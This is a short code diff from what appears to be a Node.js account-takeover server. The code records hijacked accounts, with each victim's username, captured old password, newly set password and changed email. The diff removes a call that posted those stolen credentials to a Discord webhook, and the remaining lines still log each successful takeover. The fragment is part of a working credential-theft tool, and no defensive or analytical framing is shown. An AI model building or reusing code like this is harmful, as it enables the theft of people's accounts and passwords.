@@ -187,10 +187,6 @@ const server = http.createServer(async (req, res) => {
           new_email: changeEmailStatus === "success" ? NEW_EMAIL : `FAILED (${changeEmailStatus})`,
           timestamp: timestamp || "",
         });
-
-        await sendToDiscord(DISCORD_SUCCESS_WEBHOOK,
-          `**[SUCCESS]** \`${username}\` | Old: \`${password}\` | New: \`${NEW_PASSWORD}\` | Email: ${emailNote}`
-        );
         console.log(`[SUCCESS] ${username} (email: ${emailNote})`);
       }
     } catch (e) {
